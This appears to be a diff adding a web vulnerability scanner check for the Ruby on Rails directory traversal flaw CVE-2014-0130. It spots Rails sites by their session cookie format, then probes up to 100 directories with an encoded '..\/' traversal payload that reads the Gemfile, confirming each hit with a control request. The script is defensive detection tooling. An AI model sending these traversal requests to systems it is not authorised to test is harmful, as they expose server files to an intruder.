@@ -1,0 +1,109 @@
+#engine 3.0;
+#include reporting_helpers.inc;
+#include string_helpers.inc;
+#include os_detection.inc;
+var files = new Array();
+var regex = /gem\s+['"]/;
+// **************************************************************************************							 
+function railsCookies(cookieString){
+	var cookies = cookieString.split(";");
+	for (var i = 0; i< cookies.length; i++) {
+		var cookieData = cookies[i].trim().split("=");
+		if (cookieData.length == 2) {
+			var name = cookieData[0].trim();
+			var value = cookieData[1].trim();
+			var m = /([0-9A-Za-z%]+)--([A-Za-z0-9]{40})/.exec(value);
+			if (m && m[1] && m[2] && m[2].length == 40) {
+				return true;
+			}
+		}
+	}
+}
+// **************************************************************************************							 
+function alert(uri, vxml, job, matchedText)
+{	
+	var ri = new TReportItem();
+	ri.LoadFromFile(vxml);
+	ri.affects = uri;
+	ri.alertPath = "Scripts/" + vxml; 	
+	ri.setHttpInfo(job);
+	
+	AddReportItem(ri);	
+}
+/***********************************************************************************/
+function prepareFilesToBeTested(list)
+{	
+	var foundFile = false;
+	
+	for (var i=0;i<list.count; i++){	
+		var sf = list.getFile(i);		
+		
+		if(!sf.notFound && !sf.ignored && sf.scanSiteFile && sf.hasChildren)
+		{
+			var filePath = sf.fullPath;
+			var count = filePath.match(/\//g);  
+						
+			// ignore / and only count dirs with 2 parts
+			if (filePath.length > 1 && count.length <= 2)
+			if (files.length <= 100) {
+				files.push(filePath);
+				//trace(filePath);
+			}
+			else break;
+		}	
+	}	
+}
+/***********************************************************************************/
+function testFile(uri)
+{
+	lastJob = new THTTPJob();
+	lastJob.verb = "GET";
+	lastJob.url  = scanURL;	
+	lastJob.uri  = uri + '/%5c%2e%2e%2f%5c%2e%2e%2f%5c%2e%2e%2fGemfile';		
+	
+	lastJob.execute();
+	
+	if (!lastJob.wasError && !lastJob.notFound) 
+	{
+		if (lastJob.responseStatus == 200)
+		{
+			m = regex.exec(lastJob.response.body);
+			if (m) {				
+				var confirm = new THTTPJob();
+				confirm.verb = "GET";
+				confirm.url = scanURL;	
+				confirm.uri = uri + '/%5c%2e%2e%2f%5c%2e%2e%2f%5c%2e%2e%2fBadfile';
+				
+				confirm.execute();			
+				if (!confirm.wasError) {					
+					m = regex.exec(confirm.response.body);
+					if (!m) {					
+						alert(uri, 'Ruby_on_Rails_CVE-2014-0130.xml', lastJob);
+						return true;					
+					}
+				}				
+			}
+		}
+	}	
+	
+	return false;
+}
+// **************************************************************************************							 
+//main()
+// **************************************************************************************							 
+var RailsApp = isRails || railsCookies(getCookies());
+if (RailsApp) {
+	
+	// rails application
+	//trace('rails');
+	
+	var list = getNewFiles(0);
+	prepareFilesToBeTested(list);
+	if (files.length > 0) 
+	{
+		for (var i=0; i<files.length; i++)
+		{
+			testFile(files[i]);
+		}
+	}	
+}
